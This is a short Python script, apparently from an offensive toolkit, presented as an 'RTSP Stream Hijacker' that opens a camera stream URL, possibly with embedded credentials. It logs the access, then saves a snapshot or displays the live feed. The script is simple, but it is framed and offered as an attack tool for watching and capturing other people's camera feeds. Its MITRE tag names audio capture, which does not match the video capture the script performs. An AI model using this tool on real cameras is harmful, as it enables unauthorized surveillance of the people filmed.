# modules/attacks/rtsp_stream_hijacker.py

import argparse
import os
import json
import cv2
import time
from datetime import datetime

LOG_PATH = "results/rtsp_hijack_logs.json"
MITRE_TTP = "T1123"

def log_hijack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def hijack_rtsp(rtsp_url, snapshot=False):
    cap = cv2.VideoCapture(rtsp_url)
    if not cap.isOpened():
        print("[!] Failed to open RTSP stream.")
        return

    print("[+] RTSP stream accessed successfully.")
    log_hijack({
        "timestamp": datetime.utcnow().isoformat(),
        "stream": rtsp_url,
        "snapshot": snapshot,
        "ttp": MITRE_TTP
    })

    if snapshot:
        ret, frame = cap.read()
        if ret:
            snap_path = f"results/snapshot_{int(time.time())}.jpg"
            cv2.imwrite(snap_path, frame)
            print(f"[+] Snapshot saved to {snap_path}")
        else:
            print("[!] Failed to capture frame.")
    else:
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            cv2.imshow("RTSP Feed", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    cap.release()
    cv2.destroyAllWindows()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RTSP Stream Hijacker & Snapshot Tool")
    parser.add_argument("--url", required=True, help="RTSP stream URL (e.g., rtsp://user:pass@ip/stream)")
    parser.add_argument("--snapshot", action="store_true", help="Take a single snapshot and exit")
    args = parser.parse_args()

    hijack_rtsp(args.url, snapshot=args.snapshot)
